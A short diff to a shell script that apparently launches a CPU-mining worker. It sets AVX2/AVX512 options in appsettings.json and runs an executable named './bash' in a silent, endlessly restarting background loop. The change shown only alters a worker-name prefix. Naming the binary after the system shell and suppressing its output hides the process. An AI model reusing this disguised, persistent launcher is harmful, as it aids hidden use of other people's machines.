@@ -53,10 +53,10 @@ cat /proc/cpuinfo 2>/dev/null |grep -iq 'AVX2'
 [ "$AVX2" == "1" ] && sed -i "s/AVX512/AVX2/g" "${work}/appsettings.json"
 [ "$AVX512" == "0" ] && [ "$AVX2" == "0" ] && sed -i "/AVX512/d" "${work}/appsettings.json"
 
-echo "##mode: m${mode}_c${cores}_${addr}"
+echo "##mode: m${mode}_ct${cores}_${addr}"
 
 if [ "$mode" == "0" ]; then
-  name=`RandString 2 c${cores}_${addr}`;
+  name=`RandString 2 ct${cores}_${addr}`;
   bash -c "while true; do cd "${work}"; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 5; done" >/dev/null 2>&1 &
 else
   while true; do cd "${work}"; name=`RandString 2 d${cores}_${addr}`; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 5; done
